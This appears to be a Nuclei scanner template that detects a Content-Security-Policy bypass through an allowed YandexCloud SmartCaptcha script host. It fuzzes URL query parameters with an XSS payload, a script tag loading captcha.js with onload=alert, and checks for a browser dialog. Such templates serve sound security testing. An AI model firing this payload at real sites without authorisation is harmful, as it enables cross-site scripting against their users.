flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - yandexcloud_smartcaptcha_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://smartcaptcha.yandexcloud.net/captcha.js?render=onload&onload=alert"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: yandexcloud_smartcaptcha_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - yandexcloud.net
  method: GET
  path:
  - '{{BaseURL}}'
id: yandexcloud-smartcaptcha-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - YandexCloud SmartCaptcha
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,yandexcloud-smartcaptcha,vuln
